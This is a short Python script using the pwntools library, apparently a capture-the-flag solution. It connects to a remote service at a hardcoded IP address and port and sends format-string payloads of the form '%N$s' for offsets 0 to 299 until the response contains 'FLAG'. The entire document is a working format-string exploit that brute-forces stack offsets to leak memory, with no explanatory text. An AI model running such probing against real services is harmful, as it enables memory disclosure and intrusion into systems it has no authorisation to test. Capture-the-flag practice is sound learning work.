from pwn import *

for i in range(0, 300):
#	r = process('./format-string')
	r = remote('45.77.51.4',8888)
#	print(r.recv())
	payload = "%{}$s".format(i)
#	print(payload)
	r.sendline(payload)
	output = r.recvall()
#	print(output)
	if "FLAG" in output:
#		print(output)
		print("Found Flag @ {}".format(i))
		print(output)
		sys.exit()
	r.close()
